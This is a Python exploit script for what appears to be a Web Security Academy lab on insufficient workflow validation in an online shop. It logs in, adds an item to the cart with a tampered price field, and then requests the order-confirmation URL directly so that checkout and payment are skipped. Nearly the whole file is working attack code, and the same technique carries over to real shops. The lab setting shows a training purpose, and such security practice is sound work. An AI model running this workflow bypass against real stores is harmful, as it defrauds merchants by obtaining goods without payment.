#Insufficient workflow validation
import requests
import json
import sys
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
  
# This method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
    else:
        raise ValueError("CSRF token not found")
    return csrf

# Retrieve csrf token from get_csrf_token method for every post request
def login(session, login_url, main_url, cart_url):
    csrf_token = get_csrf_token(session, login_url)
    # Login as the user
    print("===================================================================") 
    user_name_login = input("Please enter username to login: ")
    print("===================================================================") 
    password_login = input("Please enter password to login: ")
    print("===================================================================") 
    print("(+) Logging in as the user: ", user_name_login)
    print("===================================================================") 
    data_login = {"csrf": csrf_token, "username": user_name_login, "password": password_login}
    r = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("===================================================================") 
        print("(+) Successfully logged in as the user: ", user_name_login)
        adding_items_cart(session, cart_url)
        place_order_url=main_url+"/cart/order-confirmation?order-confirmed=true"
        place_order_url_res = session.get(place_order_url, verify=False, proxies=proxies)
        if "Congratulations" in place_order_url_res.text:
            print("solved the lab Insufficient workflow validation")
        else:
            print("Could not solve 'Insufficient workflow validation', Please try again")      
    else:
        print("(-) Could not login as user.", user_name_login)

#def delete_user(session, login_url, main_url):
def adding_items_cart(session, cart_url):
    data_cart_res = session.get(cart_url, verify=False, proxies=proxies)
    #adding itms to cart code here#
    if "Your cart is empty" in data_cart_res.text:
        print("Now your cart is empty")
        print(f"For Testing purpose adding default 'productID=1' to cart")
        print("***** Testing price paramenter in post request to cart *****")
        data_cart = {"productId": "1", "redir": "PRODUCT", "quantity": "1", "price": "1"}
        data_cart_res = session.post(cart_url, data=data_cart, verify=False, proxies=proxies)
        if data_cart_res.status_code == 200:
            print("Added Item with productId=1")
        else:
            print("Could not Add the Item with productId=1")  
def main():    
    if len(sys.argv) != 2:
        print("Warning!\nNot enough arguments! Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    main_url = sys.argv[1]
    login_url = main_url + "/login"
    #register_url = main_url + "/register"
    cart_url = main_url + "/cart"
    #coupon_url = cart_url+ "/coupon"
    #check_out_url = cart_url + "/checkout"
    #main_url=https://0a7f002404ed213e80d521c900ae00e6.web-security-academy.net
    #register(session, register_url, main_url)
    login(session, login_url, main_url, cart_url)
    #update_email(session, main_url)
    #delete_user(session, login_url, main_url)

if __name__ == "__main__":
    main()